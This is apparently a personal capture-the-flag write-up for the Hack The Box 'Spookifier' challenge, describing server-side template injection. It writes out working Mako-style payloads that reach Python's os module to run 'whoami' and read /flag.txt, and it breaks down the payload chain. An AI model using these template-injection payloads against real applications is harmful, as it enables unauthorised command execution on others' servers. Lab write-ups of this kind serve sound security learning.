
# #HTB 


# Spookifier - SSTI Exploitation Write-up

## Vulnerability Type

**Server-Side Template Injection (SSTI)**
The application is using a template engine that evaluates expressions inside `${...}` syntax.



## Step-by-Step Exploitation

### Step 1: Identify the Template Engine
The payload `${...}` suggests the application is using a template engine that supports expression evaluation.

![[Pasted image 20260103091038.png]]




### Step 2: Test for Code Execution

**Payload used:**
```
${self.module.cache.util.os.popen('whoami').read()}

```
**Purpose:** Execute the `whoami` command to see which user the application is running as.

![[Pasted image 20260103091138.png]]




### Step 3: Read the Flag

**First, identify the flag file name:**
```
cat /flag.txt
```


**Payload:**
```
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

![[Pasted image 20260103091417.png]]

**Result:** The contents of `/flag.txt` are displayed.


### Step 4: Capture the Flag


![[Pasted image 20260103091428.png]]

The flag is successfully retrieved.




## Payload Breakdown

|Part|Purpose|
|---|---|
|`${...}`|Template expression delimiter|
|`self`|Reference to current template context|
|`.module`|Access Python module system|
|`.cache.util.os`|Navigate through cache to reach `os` module|
|`.popen('command')`|Execute system command|
|`.read()`|Read command output|
